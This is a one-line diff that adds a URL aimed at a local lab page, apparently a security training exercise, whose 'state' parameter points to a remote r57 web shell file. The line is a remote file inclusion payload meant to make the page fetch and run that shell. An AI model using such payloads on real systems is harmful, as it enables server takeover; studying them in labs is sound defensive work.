@@ -1,0 +1,1 @@
+http://127.0.0.1/Labs/5/case-2/index.php?state=http://www.r57shell.net/shell/r57.txt?a=1.php&submit=submit
